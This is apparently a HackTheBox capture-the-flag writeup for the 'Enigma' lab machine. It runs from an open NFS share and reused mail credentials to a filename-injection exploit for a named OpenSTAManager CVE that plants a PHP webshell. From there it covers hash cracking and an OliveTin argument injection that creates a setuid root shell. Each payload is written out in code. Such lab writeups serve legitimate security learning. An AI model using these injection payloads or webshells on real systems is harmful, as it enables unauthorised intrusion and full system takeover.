---
title: "Enigma — HackTheBox Writeup"
date: 2026-06-27
authors:
  - pexpo
categories:
  - Web Exploitation
  - Linux
tags:
  - easy
  - nfs
  - imap
  - openstamanager
  - cve-2025-69212
  - olivetin
  - command-injection
  - htb
slug: enigma
description: "NFS share → webmail pivot → IMAP → CVE-2025-69212 OpenSTAManager RCE → hash crack → OliveTin password-arg injection → root"
---

# Enigma — HackTheBox Writeup
**Difficulty:** Easy | **OS:** Linux

<!-- more -->

## Overview

Enigma chains a world-readable NFS export through two mail pivots into an OpenSTAManager P7M filename injection RCE, then escalates via OliveTin's unfiltered `password`-type argument.

**Chain:** NFS PDF → kevin creds → Roundcube webmail → Sarah's IMAP → support portal creds → OpenSTAManager CVE-2025-69212 → www-data → DB creds → bcrypt crack → haris → OliveTin injection → root

---

## NFS → Webmail → IMAP

```bash
showmount -e <IP>      # /srv/nfs/onboarding *
mount -t nfs <IP>:/srv/nfs/onboarding /mnt/enigma
pdftotext New_Employee_Access.pdf -
# kevin:Enigma2024!  →  mail001.enigma.htb
```

Kevin's inbox had a hint about Sarah receiving IT creds. IMAP over SSL with the same password gave access to Sarah's inbox and the support portal URL + credentials.

---

## CVE-2025-69212 — OpenSTAManager P7M Injection

OpenSTAManager v2.9.8 passes ZIP-extracted filenames directly into `exec()`. Escape the double-quote context to drop a webshell:

```python
cmd = 'cd files && echo \'<?php system($_GET["c"]); ?>\' > SHELL.php'
name = f'invoice.p7m";{cmd};echo ".p7m'
# write name as ZipInfo entry, upload via Electronic invoicing
```

Server returns 500 but the shell is already written. Reverse shell via the webshell, land as `www-data`.

---

## Hash Crack → haris

```bash
cat config.inc.php   # brollin:Fri3nds@9099
mysql → SELECT password FROM zz_users WHERE username='haris'
hashcat -m 3200 hash rockyou.txt   # bestfriends
su - haris
```

---

## OliveTin → root

OliveTin running as root on `127.0.0.1:1337`, no auth. A Backup Database action uses a `password`-type argument — unlike `ascii_identifier`, it passes input raw into the shell command. Single-quote injection breaks out:

```bash
db_pass = "x';cp /bin/bash /tmp/rootbash;chmod +s /tmp/rootbash;echo '"
curl -X POST http://127.0.0.1:1337/api/StartAction --json @payload.json
/tmp/rootbash -p
```

---

## Things I Learned

NFS with `*` ACL is free loot. IMAP is an underused pivot when SSH is key-only. OliveTin `password` type ≠ sanitised — always check the argument type in the config before assuming injection is blocked.

---

*Pexpo | HTB | 27 Jun 2026*
